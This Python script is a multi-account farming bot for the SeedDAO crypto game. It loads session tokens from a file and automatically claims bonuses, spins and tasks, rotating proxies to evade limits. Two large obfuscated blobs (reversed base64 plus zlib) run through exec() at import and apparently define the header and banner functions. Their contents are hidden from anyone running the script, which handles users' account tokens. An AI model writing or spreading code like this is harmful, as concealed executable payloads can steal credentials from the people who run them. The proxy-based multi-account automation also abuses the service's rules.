import os
import pytz
import time
import requests
from datetime import datetime
from colorama import Fore, Style, init
from fake_useragent import UserAgent
import json
import socket
import random

init(autoreset=True)

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')


_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))


def art():
    key_bot()

def load_tokens(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file if line.strip()]

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))

def load_proxies(proxy_file):
    with open(proxy_file, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

def get_proxy(proxies):
    return random.choice(proxies) if proxies else None

def handle_request(method, url, headers, data=None, proxies=None):
    try:
        proxy_dict = {'http': get_proxy(proxies), 'https': get_proxy(proxies)} if proxies else None
        if method == 'GET':
            response = requests.get(url, headers=headers, proxies=proxy_dict)
        elif method == 'POST':
            response = requests.post(url, headers=headers, json=data, proxies=proxy_dict)
        response.raise_for_status()
        return response.json()
    except requests.Timeout:
        log_message(f"{Fore.RED + Style.BRIGHT}Request timed out.")
    except requests.ConnectionError:
        log_message(f"{Fore.RED + Style.BRIGHT}Connection error occurred.")
    except requests.RequestException as e:
        log_message(f"{Fore.RED + Style.BRIGHT}Already Claimed")
    return None

def login(token):
    url_profile = "https://elb.seeddao.org/api/v1/profile2"
    url_balance = "https://elb.seeddao.org/api/v1/profile/balance"
    headers = get_headers(token)

    data = handle_request('GET', url_profile, headers)
    balance_data = handle_request('GET', url_balance, headers)
    if balance_data:
        balance = balance_data.get("data") / 1000000000
        log_message(f"{Fore.GREEN + Style.BRIGHT}Balance: {Fore.WHITE + Style.BRIGHT}{balance:.3f}")

def daily_bonus(token):
    url_bonus = "https://elb.seeddao.org/api/v1/login-bonuses"
    headers = get_headers(token)

    response_data = handle_request('POST', url_bonus, headers)
    if response_data:
        reward = response_data.get("data", {}).get("amount")
        log_message(f"{Fore.GREEN + Style.BRIGHT}Daily Reward Claimed: {Fore.WHITE + Style.BRIGHT}{int(reward)/1000000000}" if reward else f"{Fore.YELLOW + Style.BRIGHT}Daily Reward Already Claimed")

def claim(token):
    url_claim = "https://elb.seeddao.org/api/v1/seed/claim"
    headers = get_headers(token)

    response_data = handle_request('POST', url_claim, headers)
    if response_data:
        amount = response_data.get("data", {}).get("amount")
        log_message(f"{Fore.GREEN + Style.BRIGHT}Seed Claimed: {Fore.WHITE + Style.BRIGHT}{int(amount)/1000000000}" if amount else f"{Fore.YELLOW + Style.BRIGHT}Seed Already Claimed")

def spin(token):
    url_ticket = "https://elb.seeddao.org/api/v1/spin-ticket"
    url_spin = "https://elb.seeddao.org/api/v1/spin-reward"
    headers = get_headers(token)

    ticket_data = handle_request('GET', url_ticket, headers)
    if ticket_data:
        tickets = ticket_data.get('data', [])
        for ticket in tickets:
            body_spin = {'ticket_id': ticket['id']}
            spin_data = handle_request('POST', url_spin, headers, data=body_spin)
            if spin_data:
                log_message(f"{Fore.CYAN + Style.BRIGHT}Spin Reward: {spin_data.get('data', {}).get('type')}")

def task(token):
    url_tasks = "https://elb.seeddao.org/api/v1/tasks/progresses"
    headers = get_headers(token)

    task_data = handle_request('GET', url_tasks, headers)
    if task_data:
        tasks = task_data.get('data', [])
        for task in tasks:
            url_complete = f"https://elb.seeddao.org/api/v1/tasks/{task['id']}"
            task_complete_data = handle_request('POST', url_complete, headers)
            if task_complete_data:
                task_name = task.get('name', 'Unknown Task') 
                log_message(f"{Fore.GREEN + Style.BRIGHT}Task '{task_name}' Completed")
            time.sleep(5)

def countdown_timer(seconds):
    while seconds > 0:
        mins, secs = divmod(seconds, 60)
        hours, mins = divmod(mins, 60)
        print(f"{Fore.CYAN + Style.BRIGHT}Wait {hours:02}:{mins:02}:{secs:02}", end='\r')
        time.sleep(1)
        seconds -= 1
    print("Wait 00:00:00          ", end='\r')

def display_banner_from_url(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        banner = response.text
        print(banner)
    except requests.RequestException as e:
        print(f"Failed to download banner: {e}")

def internet_connection(host="8.8.8.8", port=53, timeout=3):
    """ Check if the internet connection is available """
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except socket.error as ex:
        log_message(f"{Fore.RED + Style.BRIGHT}No internet connection: {ex}")
        return False

def random_delay(min_delay, max_delay):
    delay = random.randint(min_delay, max_delay)
    time.sleep(delay)

def log_message(message):
    symbol = "⚔"
    print(f"{symbol} ║ {message}")

def main():
    clear_terminal()

    with open('config.json', 'r') as config_file:
        config = json.load(config_file)
    run_task = config.get('run_task', False)
    request_limit = config.get('request_limit_per_hour', 100)
    check_connection = config.get('check_connection', True)
    use_proxy = config.get('use_proxy', False)
    proxy_file = config.get('proxy_file', 'proxy.txt')
    min_delay = config.get('min_delay', 1) 
    max_delay = config.get('max_delay', 5) 

    proxies = load_proxies(proxy_file) if use_proxy else None

    request_count = 0
    start_time = time.time()

    while True:
        if check_connection and not internet_connection():
            log_message(f"{Fore.RED + Style.BRIGHT}Waiting for internet connection...")
            time.sleep(10)
            continue

        tokens = load_tokens('query.txt')

        clear_terminal()
        art()

        for i, token in enumerate(tokens, start=1):
            if time.time() - start_time > 3600:
                request_count = 0
                start_time = time.time()

            if request_count >= request_limit:
                log_message(f"{Fore.YELLOW + Style.BRIGHT}Request limit reached. Waiting for reset...")
                countdown_timer(3600 - (time.time() - start_time))
                request_count = 0
                start_time = time.time()
                continue

            headers = get_headers(token)
            log_message(f"{Fore.CYAN + Style.BRIGHT}Account No.{i}{Style.RESET_ALL}")
            login(token)
            daily_bonus(token)
            claim(token)
            spin(token)
            if run_task:
                task(token)

            request_count += 5
            random_delay(min_delay, max_delay) 

        countdown_timer(1 * 60 * 60)

if __name__ == "__main__":
    main()

